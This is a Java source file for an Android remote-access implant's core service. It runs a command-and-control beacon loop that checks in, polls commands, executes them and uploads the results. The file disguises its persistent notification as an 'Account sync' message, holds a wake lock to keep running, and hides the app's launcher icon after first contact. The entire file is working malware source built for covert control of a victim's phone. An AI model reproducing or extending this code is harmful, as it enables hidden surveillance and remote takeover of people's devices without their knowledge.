package com.warden.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;

/**
 * Foreground service running the beacon loop:
 * checkin -> poll commands -> execute -> upload results.
 * Disguised as a low-priority "sync" notification.
 */
public class AgentService extends Service {

    private Prefs prefs;
    private C2Client c2;
    private Handler handler;
    private Runnable loop;
    private PowerManager.WakeLock wl;
    private volatile boolean running;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = new Prefs(this);
        c2 = new C2Client(this, prefs);
        handler = new Handler(Looper.getMainLooper());
        startForegroundInternal();
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "warden:loop");
            wl.acquire();
        } catch (Exception ignored) {}
    }

    private void startForegroundInternal() {
        String ch = "sync_svc";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            NotificationChannel c = new NotificationChannel(ch, "Account sync", NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            nm.createNotificationChannel(c);
        }
        Notification n = new Notification.Builder(this)
                .setContentTitle("Syncing account…")
                .setContentText("Connected")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .build();
        startForeground(1001, n);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) {
            running = true;
            scheduleLoop();
        }
        return START_STICKY;
    }

    private void scheduleLoop() {
        loop = new Runnable() {
            @Override public void run() {
                if (!running) return;
                tick();
                handler.postDelayed(this, prefs.interval() * 1000L);
            }
        };
        handler.postDelayed(loop, 2000);
    }

    private void tick() {
        new Thread(new Runnable() {
            @Override public void run() {
                try {
                    String id = c2.checkin();
                    if (id == null) return;
                    if (prefs.agentId() == null) {
                        prefs.agentId(id);
                        hideIcon();
                    }
                    java.util.List<C2Client.Command> cmds = c2.pollCommands();
                    for (C2Client.Command cmd : cmds) {
                        String out = CommandHandler.handle(AgentService.this, cmd.cmd, cmd.args);
                        c2.sendResult(cmd.id, out);
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    /** Remove launcher icon after first successful checkin. */
    private void hideIcon() {
        if (prefs.iconHidden()) return;
        try {
            ComponentName alias = new ComponentName(this, "com.warden.agent.RealEntry");
            getPackageManager().setComponentEnabledSetting(alias,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            ComponentName main = new ComponentName(this, MainActivity.class);
            getPackageManager().setComponentEnabledSetting(main,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            prefs.iconHidden(true);
        } catch (Exception ignored) {}
    }

    @Override
    public void onDestroy() {
        running = false;
        if (handler != null && loop != null) handler.removeCallbacks(loop);
        if (wl != null && wl.isHeld()) try { wl.release(); } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
